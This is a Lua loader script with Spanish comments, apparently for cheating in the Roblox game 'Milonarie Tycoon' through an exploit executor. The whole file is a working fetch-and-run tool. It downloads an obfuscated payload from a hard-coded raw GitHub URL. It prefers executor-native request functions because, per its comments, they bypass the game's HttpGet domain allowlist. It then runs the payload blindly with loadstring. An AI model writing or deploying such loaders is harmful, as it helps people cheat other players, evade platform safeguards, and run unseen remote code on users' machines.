--[[
	Aero loader :: Milonarie Tycoon

	Pega esto en el executor con el juego abierto.
	Descarga el payload ofuscado con Prometheus y lo ejecuta.

	PAYLOAD_URL: pon la URL donde hostees el .obfuscated.lua
	(ej: raw.githubusercontent.com/<user>/<repo>/<branch>/roblox/milonarie_tycoon/release/milonarie_tycoon_obfuscated.lua)
]]

local PAYLOAD_URL = "https://raw.githubusercontent.com/maneulgonzalez1012-cyber/vvv/arena/5e9deb5f-vvv/roblox/milonarie_tycoon/release/milonarie_tycoon_obfuscated.lua"

local function fetch(url)
	-- 1) natives del executor: no tienen la restriccion de dominio de HttpGet
	if type(request) == "function" then
		local ok, body = pcall(request, { Url = url, Method = "GET" })
		if ok and type(body) == "string" and #body > 0 then
			return body
		end
	end
	if type(http_request) == "function" then
		local ok, body = pcall(http_request, url)
		if ok and type(body) == "string" and #body > 0 then
			return body
		end
	end
	-- 2) HttpGet de Roblox: solo si el dominio esta en la allowlist del juego
	local ok, body = pcall(function()
		return game:HttpGet(url)
	end)
	if ok and type(body) == "string" and #body > 0 then
		return body
	end
	return nil
end

local source = fetch(PAYLOAD_URL)
if not source then
	error("[Aero] no se pudo descargar el payload: revisa PAYLOAD_URL y el allowlist de HttpGet del juego")
end

local chunk, err
if type(loadstring) == "function" then
	chunk, err = loadstring(source)
end
if not chunk and type(load) == "function" then
	chunk, err = load(source)
end
if not chunk then
	error("[Aero] el payload no compila: " .. tostring(err))
end

chunk()
